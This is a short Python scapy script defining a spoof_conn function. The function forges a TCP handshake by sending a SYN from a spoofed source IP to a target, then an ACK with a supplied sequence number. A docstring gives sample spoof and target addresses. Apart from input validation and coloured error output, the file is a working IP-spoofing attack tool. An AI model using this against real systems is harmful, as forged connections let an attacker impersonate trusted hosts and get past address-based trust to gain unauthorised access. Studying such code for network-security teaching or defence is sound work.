from scapy.all import *
import re
from custom_modules.ConsoleMessenger import CONSOLE_MESSENGER_SWITCH as cms
from custom_modules.PatternConstants import valid_ipv4 as vip4
from custom_modules.Utils import non_none_value

""" 
    src:    192.168.1.212       Spoof IP 
    tgt:    192.168.1.1         Target IP 
    ack:    2024371201          SeqNum 
    call:   spoof_conn(src,tgt,ack) 
"""


def spoof_conn(src=None, tgt=None, ack=None, sport=None, dport=None):
    results = non_none_value(src, tgt, ack, sport, dport)
    status = results["status"]
    valid_src = vip4(src)
    valid_tgt = vip4(tgt)
    cus = cms["custom"]

    if not valid_src:
        e = cus(255, 65, 65, "Error:")
        msg = cus(
            255,
            255,
            255,
            "Expected a valid IPv4 source address but received: [{}]".format(src),
        )
        e_msg = "{}\t{}".format(e, msg)
        raise ValueError(e_msg)

    if not valid_tgt:
        e = cus(255, 65, 65, "Error:")
        msg = cus(
            255,
            255,
            255,
            "Expected a valid IPv4 target address but received: [{}]".format(tgt),
        )
        e_msg = "{}\t{}".format(e, msg)
        raise ValueError(e_msg)

    if status:
        try:
            sport = int(sport)
            dport = int(dport)
            ack = int(ack)
        except ValueError as ver:
            e = cus(255, 65, 65, "Error:")
            msg = cus(255, 255, 255, "{}".format(ver))
            e_msg = "{}\t{}".format(e, msg)
            raise ValueError(e_msg)

        ip_layer = IP(src=src, dst=tgt)
        tcp_layer = TCP(sport=sport, dport=dport)
        syn_pkt = ip_layer / tcp_layer

        send(syn_pkt)

        ip_layer = IP(src=src, dst=tgt)
        tcp_layer = TCP(sport=sport, dport=dport, ack=ack)
        ack_pkt = ip_layer / tcp_layer

        send(ack_pkt)
    else:
        errors = results["errors"]
        line = ""

        for i, e in enumerate(errors):
            if i < (len(errors) - 1):
                line += "{}\t".format(e)
            else:
                line += "{}".format(e)

        e = cus(255, 65, 65, "Error:")
        msg = cus(255, 255, 255, "Expected 5 arguments but received [{}]".format(line))
        e_msg = "{}\t{}".format(e, msg)
        raise ValueError(e_msg)
